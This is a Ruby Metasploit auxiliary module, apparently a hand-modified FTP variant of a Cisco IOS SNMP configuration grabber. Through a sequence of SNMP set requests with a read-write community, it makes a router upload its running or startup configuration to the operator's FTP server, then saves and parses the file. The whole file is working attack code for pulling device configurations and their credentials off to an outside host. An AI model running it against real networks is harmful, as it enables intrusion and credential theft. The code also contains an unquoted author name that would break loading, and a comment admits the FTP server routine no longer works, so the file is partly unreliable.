
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Cisco IOS SNMP Configuration Grabber (FTP)',
      'Description' => %q{
        This module will download the startup or running configuration
        from a Cisco IOS device using SNMP and FTP. A read-write SNMP
        community is required. The SNMP community scanner module can
        assist in identifying a read-write community. The target must
        be able to connect back to the Metasploit system and the use of
        NAT will cause the FTP transfer to fail. THIS IS BASICALLY A RIP OF THE TFTP 
        MODULE WITH SMALL MODIFICATIONS TO SUPPORT FTP.
      },
      'Author'      =>
        [
          'pello <fropert[at]packetfault.org>', 'hdm', m1xus
        ],
      'License'     => MSF_LICENSE
    )
    register_options([
      OptEnum.new("SOURCE", [true, "Grab the startup (3) or running (4) configuration", "4", ["3","4"]]),
      OptString.new('OUTPUTDIR', [ false, "The directory where we should save the configuration files (disabled by default)"]),
      OptAddressLocal.new('LHOST', [ false, "The IP address of the system running this module" ]),
      OptInt.new('LPORT', [true, "The local FTP port to use", 21]),
      OptString.new('FTP_USER',[true, "FTP username to use", "anonymous"]),
      OptString.new('FTP_PASS',[true, "FTP password use", "anonymous"])
    ])
  end

  #
  # Callback for incoming files
  #
  def process_incoming(info)
    return if not info[:file]
    name = info[:file][:name]
    data = info[:file][:data]
    from = info[:from]
    return if not (name and data)

    # Trim off IPv6 mapped IPv4 if necessary
    from = from[0].dup
    from.gsub!('******:', '')

    print_status("Incoming file from #{from} - #{name} #{data.length} bytes")

    # Save the configuration file if a path is specified
    if datastore['OUTPUTDIR']
      name = "#{from}.txt"
      ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
      path = ::File.join(datastore['OUTPUTDIR'], name)
      ::File.open(path, "wb") do |fd|
        fd.write(data)
      end
      print_status("Saved configuration file to #{path}")
    end

    # Toss the configuration file to the parser
    cisco_ios_config_eater(from, 161, data)
  end

  def start_ftp_server
    print_status("Starting FTP server...")

    # Set options for the FTP server ----- I DONT BELIEVE THIS WORKS ANYMORE! NEED TO START LOCAL FTP SERVER OUTSIDE OF MSF!
    # Load and run the FTP server module
    ftp_module = framework.auxiliary.create("auxiliary/server/ftp_file_server")
    ftp_module.run_simple(
      'Action' => 'Service'
    )
    print_status("FTP server started.")
  end

  def run_host(ip)
    # Start the FTP server
    #start_ftp_server

    begin
      source   = datastore['SOURCE'].to_i
      protocol = 2
      filename = "#{ip}.txt"
      lhost    = datastore['LHOST'] || Rex::Socket.source_address(ip)
      ftp_user = datastore['FTP_USER']
      ftp_pass = datastore['FTP_PASS']

      ccconfigcopyprotocol = "1.3.6.1.4.1.9.9.96.1.1.1.1.2."
      cccopysourcefiletype = "1.3.6.1.4.1.9.9.96.1.1.1.1.3."
      cccopydestfiletype   = "1.3.6.1.4.1.9.9.96.1.1.1.1.4."
      cccopyserveraddress  = "1.3.6.1.4.1.9.9.96.1.1.1.1.5."
      cccopyfilename       = "1.3.6.1.4.1.9.9.96.1.1.1.1.6."
      cccopyusername       = "1.3.6.1.4.1.9.9.96.1.1.1.1.7."
      cccopypassword       = "1.3.6.1.4.1.9.9.96.1.1.1.1.8."
      cccopyentryrowstatus = "1.3.6.1.4.1.9.9.96.1.1.1.1.14."

      session = rand(255) + 1

      snmp = connect_snmp

      varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}" , SNMP::Integer.new(protocol))
      value = snmp.set(varbind)

      # If the above line didn't throw an error, the host is alive and the community is valid
      print_status("Trying to acquire configuration from #{ip}...")

      varbind = SNMP::VarBind.new("#{cccopysourcefiletype}#{session}" , SNMP::Integer.new(source))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopydestfiletype}#{session}", SNMP::Integer.new(1))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopyserveraddress}#{session}", SNMP::IpAddress.new(lhost))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopyfilename}#{session}", SNMP::OctetString.new(filename))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopyusername}#{session}", SNMP::OctetString.new(ftp_user))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopypassword}#{session}", SNMP::OctetString.new(ftp_pass))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopyentryrowstatus}#{session}", SNMP::Integer.new(1))
      value = snmp.set(varbind)

      varbind = SNMP::VarBind.new("#{cccopyentryrowstatus}#{session}", SNMP::Integer.new(6))
      value = snmp.set(varbind)

    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end
end
